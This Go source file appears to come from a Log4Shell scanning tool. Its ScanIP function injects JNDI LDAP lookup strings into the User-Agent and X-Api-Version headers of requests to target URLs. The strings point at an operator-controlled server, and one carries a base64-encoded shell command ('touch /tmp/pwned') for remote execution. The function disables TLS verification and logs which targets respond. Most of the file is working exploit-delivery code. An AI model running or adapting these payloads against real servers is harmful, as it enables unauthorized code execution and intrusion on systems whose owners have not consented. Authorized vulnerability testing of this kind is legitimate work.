package cmd

import (
	"crypto/tls"
	"fmt"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/pterm/pterm"
	log "github.com/sirupsen/logrus"
)

func ScanIP(targetUrl string, serverUrl string, wg *sync.WaitGroup, resChan chan string) {
	defer wg.Done()

	client := &http.Client{
		Timeout: 3 * time.Second,
		Transport: &http.Transport{
			TLSHandshakeTimeout:   1 * time.Second,
			ResponseHeaderTimeout: 1 * time.Second,
			ExpectContinueTimeout: 1 * time.Second,
			TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
		},
	}

	// TODO: add endpoint exploit
	targetUserAgent := fmt.Sprintf("${jndi:ldap://%s/exploit.class}", serverUrl)
	targetHeader := fmt.Sprintf("${jndi:ldap://%s/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}", serverUrl)
	log.Debugf("Target URL: %s", targetUrl)
	//log.Debugf("Target User-Agent: %s", targetUserAgent)
	//log.Debugf("Target X-Api-Version: %s", targetHeader)
	request, err := http.NewRequest("GET", targetUrl, nil)
	if err != nil {
		pterm.Error.Println(err)
		log.Fatal(err)
	}
	request.Header.Set("User-Agent", targetUserAgent)
	request.Header.Add("X-Api-Version", targetHeader)
	response, err := client.Do(request)
	if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
		log.Debug(err)
	}
	if response != nil {
		url := strings.Split(targetUrl, ":")
		if len(url) != 3 {
			log.Fatal("Error in response url parsing:", targetUrl)
		}
		msg := fmt.Sprintf("request,%s,%s,%d", strings.Replace(url[1], "/", "", -1), url[2], response.StatusCode)
		updateCsvRecords(msg)
		resChan <- msg
		log.Infof(msg)
	}
}

// GetLocalIP returns the non loopback local IP of the host
func GetLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	for _, address := range addrs {
		// check the address type and if it is not a loopback the display it
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return ""
}
